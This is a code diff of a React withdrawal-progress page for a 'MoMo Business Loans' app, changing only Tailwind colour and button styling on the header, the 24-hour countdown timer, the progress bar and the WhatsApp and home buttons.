@@ -87,7 +87,7 @@ export default function WithdrawalProgressPage() {
     <PageLoader>
       <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
         {/* Header */}
-        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -95,7 +95,7 @@ export default function WithdrawalProgressPage() {
                 MoMo <span className="font-normal opacity-90">Business Loans</span>
               </span>
             </div>
-            <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
+            <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
               24-Hour Queue
             </span>
           </div>
@@ -109,10 +109,10 @@ export default function WithdrawalProgressPage() {
             <div className="flex items-center justify-between pb-4 border-b border-gray-100">
               <div className="flex items-center gap-2">
                 <span className="relative flex h-3 w-3">
-                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75" />
-                  <span className="relative inline-flex rounded-full h-3 w-3 bg-amber-500" />
+                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-sky-400 opacity-75" />
+                  <span className="relative inline-flex rounded-full h-3 w-3 bg-sky-500" />
                 </span>
-                <span className="text-xs font-bold uppercase tracking-wider text-amber-800">
+                <span className="text-xs font-bold uppercase tracking-wider text-[#004F71]">
                   Withdrawal Queue Active
                 </span>
               </div>
@@ -123,8 +123,8 @@ export default function WithdrawalProgressPage() {
 
             {/* Title & 24hr Waiting Progress Indicator */}
             <div className="text-center my-6">
-              <div className="w-16 h-16 bg-amber-50 rounded-2xl border-2 border-amber-300 flex items-center justify-center mx-auto mb-3 shadow-inner">
-                <Clock className="w-8 h-8 text-amber-600 animate-pulse" />
+              <div className="w-16 h-16 bg-sky-50 rounded-2xl border-2 border-sky-200 flex items-center justify-center mx-auto mb-3 shadow-inner">
+                <Clock className="w-8 h-8 text-[#004F71] animate-pulse" />
               </div>
               <h2 className="text-2xl sm:text-3xl font-black text-gray-950 tracking-tight">
                 24-Hour Loan Withdrawal Progress
@@ -136,24 +136,24 @@ export default function WithdrawalProgressPage() {
 
             {/* Big Countdown Timer Display */}
             <div className="bg-gradient-to-br from-[#003853] via-[#004f71] to-[#002b40] rounded-2xl p-5 text-white text-center shadow-lg mb-6 border border-[#00608a]/60">
-              <span className="text-[11px] font-bold uppercase tracking-widest text-[#ffcc00] block mb-2">
+              <span className="text-[11px] font-bold uppercase tracking-widest text-sky-300 block mb-2">
                 Estimated Time Remaining
               </span>
               <div className="flex items-center justify-center gap-2 sm:gap-3 text-center">
                 <div className="bg-black/30 rounded-xl px-3 py-2 min-w-[64px] border border-white/10">
-                  <span className="text-2xl sm:text-3xl font-black font-mono text-[#ffcc00]">
+                  <span className="text-2xl sm:text-3xl font-black font-mono text-white">
                     {String(hours).padStart(2, '0')}
                   </span>
                   <span className="block text-[10px] text-gray-300 uppercase font-semibold">Hours</span>
                 </div>
-                <span className="text-2xl font-black text-[#ffcc00]">:</span>
+                <span className="text-2xl font-black text-sky-300">:</span>
                 <div className="bg-black/30 rounded-xl px-3 py-2 min-w-[64px] border border-white/10">
-                  <span className="text-2xl sm:text-3xl font-black font-mono text-[#ffcc00]">
+                  <span className="text-2xl sm:text-3xl font-black font-mono text-white">
                     {String(minutes).padStart(2, '0')}
                   </span>
                   <span className="block text-[10px] text-gray-300 uppercase font-semibold">Minutes</span>
                 </div>
-                <span className="text-2xl font-black text-[#ffcc00]">:</span>
+                <span className="text-2xl font-black text-sky-300">:</span>
                 <div className="bg-black/30 rounded-xl px-3 py-2 min-w-[64px] border border-white/10">
                   <span className="text-2xl sm:text-3xl font-black font-mono text-white">
                     {String(seconds).padStart(2, '0')}
@@ -166,11 +166,11 @@ export default function WithdrawalProgressPage() {
               <div className="mt-4">
                 <div className="flex justify-between text-[11px] font-bold mb-1 text-gray-300">
                   <span>Clearing Queue Progress</span>
-                  <span className="text-[#ffcc00] font-mono">{progressPercent}%</span>
+                  <span className="text-sky-300 font-mono">{progressPercent}%</span>
                 </div>
                 <div className="w-full bg-black/40 h-2.5 rounded-full overflow-hidden border border-white/10">
                   <div
-                    className="bg-[#ffcc00] h-full transition-all duration-1000 ease-linear rounded-full shadow-sm"
+                    className="bg-sky-400 h-full transition-all duration-1000 ease-linear rounded-full shadow-sm"
                     style={{ width: `${progressPercent}%` }}
                   />
                 </div>
@@ -304,7 +304,7 @@ export default function WithdrawalProgressPage() {
                 href={whatsappUrl}
                 target="_blank"
                 rel="noopener noreferrer"
-                className="w-full py-3.5 px-4 rounded-xl bg-[#25D366] hover:bg-[#20ba59] text-white font-black text-sm flex items-center justify-center gap-2 shadow-md transition cursor-pointer"
+                className="w-full py-4 px-4 rounded-full bg-[#25D366] hover:bg-[#20ba59] text-white font-bold text-sm tracking-wide uppercase flex items-center justify-center gap-2 shadow-md transition cursor-pointer"
               >
                 <MessageCircle className="w-5 h-5 fill-white" />
                 <span>Follow Up on WhatsApp ({settings.whatsappNumber})</span>
@@ -313,7 +313,7 @@ export default function WithdrawalProgressPage() {
               <button
                 type="button"
                 onClick={() => navigate('/')}
-                className="w-full py-3 rounded-xl bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold text-xs flex items-center justify-center gap-2 transition cursor-pointer"
+                className="w-full py-3.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold text-sm transition cursor-pointer flex items-center justify-center gap-2"
               >
                 <Home className="w-4 h-4" />
                 <span>Back to Home</span>
